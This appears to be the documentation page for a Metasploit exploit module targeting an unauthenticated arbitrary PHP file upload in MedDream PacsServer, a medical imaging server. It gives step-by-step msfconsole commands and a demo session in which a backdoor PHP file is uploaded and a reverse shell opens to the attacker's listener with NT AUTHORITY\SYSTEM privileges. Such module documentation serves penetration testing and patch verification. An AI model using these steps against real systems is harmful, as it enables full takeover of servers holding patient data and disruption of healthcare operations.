## Details
This module exploits a vulnerability found in MedDream PacsServer 6.8.3.751, which allows unauthenticated attackers to perform Remote Code Execution via an arbitrary PHP file upload. Depending on how the web server is configured to run will determine what level of access privilege obtained.

## Verification
List the steps needed to make sure this thing works

- [ ] Start `msfconsole`
- [ ] `use exploit/windows/http/meddream_pacs_rce`
- [ ] `set rhosts <ip address of meddream pacs server>`
- [ ] `check`
- [ ] **Verify** that application is vulnerable
- [ ] `set lhost <ip address of metasploit system>`
- [ ] `exploit`
- [ ] **Verify** that shell is returned

## Demo
```
$ ./msfconsole -q
msf6 > use exploit/windows/http/meddream_pacs_rce
[*] Using configured payload php/reverse_php
msf6 exploit(windows/http/meddream_pacs_rce) > set rhosts 192.168.0.223
rhosts => 192.168.0.223
msf6 exploit(windows/http/meddream_pacs_rce) > check

[+] MedDream version 6.8.3 detected
[*] 192.168.0.223:80 - The target appears to be vulnerable.
msf6 exploit(windows/http/meddream_pacs_rce) > set lhost 192.168.20.100
lhost => 192.168.20.100
msf6 exploit(windows/http/meddream_pacs_rce) > exploit

[*] Started reverse TCP handler on 192.168.20.100:4444
[*] Uploading backdoor file: BeKzHyHnC.php
[*] New filename on system: '20201016-132215--BeKzHyHnC.php
[*] Trigging the exploit...
[*] Command shell session 1 opened (192.168.20.100:4444 -> 192.168.0.223:50372) at 2020-10-16 13:22:15 -0400
[!] Tried to delete 20201016-132215--BeKzHyHnC.php, unknown result

whoami
nt authority\system
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : foo.bar
   Link-local IPv6 Address . . . . . : fe80::d125:4e8f:1f9d:4399%2
   IPv4 Address. . . . . . . . . . . : 192.168.0.223
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 192.168.254.254
```
## Test Environment
Tested against MedDream PacsServer 6.8.3.751 running on Windows 2016

